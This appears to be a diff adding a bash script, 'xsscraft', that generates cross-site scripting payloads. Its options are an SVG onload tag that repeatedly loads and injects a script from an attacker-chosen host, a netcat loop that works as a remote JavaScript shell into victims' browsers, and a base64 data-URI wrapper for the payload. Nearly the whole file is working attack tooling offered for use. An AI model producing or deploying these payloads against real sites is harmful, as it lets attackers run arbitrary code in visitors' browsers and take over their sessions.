@@ -1,0 +1,66 @@
+#!/bin/bash
+
+
+function help {
+    echo -n "Usage: "
+    cecho white "xsscraft "
+    cecho yellow "<OPTION>"
+    cecho white " "
+    cecho cyan "[PARAMS]"
+    cecho reset "\n\n"
+    cecho yellow "Options:"
+    cecho reset "\n"
+    cecho white "svg-js-victim"
+    cecho reset: ": <svg/onload=setInterval ... >\n"
+    echo  "     tag that requests every minute scrit from a host"
+    echo  "     and injects result as a <scrip> tag"
+    echo
+    echo -n "     Parameters: "
+    cecho white "xssscraft svg-js-victim "
+    cecho cyan "<HOST:PORT> <INTERVAL (ms)>"
+    cecho reset "\n\n"
+
+    cecho white "svg-js-alert-shell"
+    cecho reset: ": netcat terminal for remote js execution\n"
+    echo  "     Wait for TCP requests on a given port and echo the terminal input when happen"
+    echo
+    echo -n "     Parameters: "
+    cecho white "xssscraft svg-js-alert-shell "
+    cecho cyan "PORT"
+    cecho reset "\n"
+
+    echo
+    exit 1;
+}
+   
+if [ -z $1 ] || [ "$1" == "--help" ] || [ "$1" == "help" ]; then
+    help;
+elif [ "$1" == "svg-js-victim" ]; then
+
+    if [ -z $2 ]; then
+        cecho red "Missing HOST:PORT"
+        echo
+        help;
+    elif [ -z $3 ]; then
+        cecho red "Missing INTERVAL"
+        echo
+        help;
+    fi
+
+    echo -n "<svg/onload=setInterval(function(){d=document;try{d.getElementById('x').remove()}catch(e){};z=d.createElement('script');z.id='x';z.src='"$2"';d.body.appendChild(z)},"$3") />";
+    exit 0;
+elif [ "$1" == "svg-js-alert-shell" ]; then
+    
+    if [ -z "$2" ]; then
+        cecho red "Missing PORT"
+        help;
+    fi
+
+    while :; do echo -n "alert> "; read c; echo "alert('"$c"');" | nc -l $2 >/dev/null; done
+elif [ "$1" == "payload" ]; then
+    echo -n "data:text/html;base64,"$(urlencode $(echo -n "<html><body>"$(xsscraft svg-js-victim $2 $3) | base64 -w 0))
+    exit 0;
+else
+    help;
+fi
+
